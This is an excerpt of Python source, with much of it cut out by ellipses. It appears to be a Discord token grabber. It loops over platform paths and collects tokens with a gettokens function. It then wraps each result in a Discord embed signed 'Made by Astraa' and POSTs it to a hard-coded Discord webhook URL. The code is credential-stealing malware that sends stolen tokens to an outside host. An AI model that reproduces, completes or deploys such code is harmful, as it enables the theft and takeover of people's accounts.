    ...
    for platform, path in PATHS.items():
        ...
        for token in gettokens(path):
            ...
            try:
                    ...
                    'embeds': [
                        {
                            ...
                            'color': 3092790,
                            'footer': {
                                'text': "Made by Astraa ・ https://github.com/pirol"
                            },
                            'thumbnail': {
                ...
                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1497218026314137690/WR2Kic1IHc7n6p892zuWXT3_p7eI-NOcGFKrK2t_5L1ndyxt8f9mlAWJn8LGH6xftDth', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
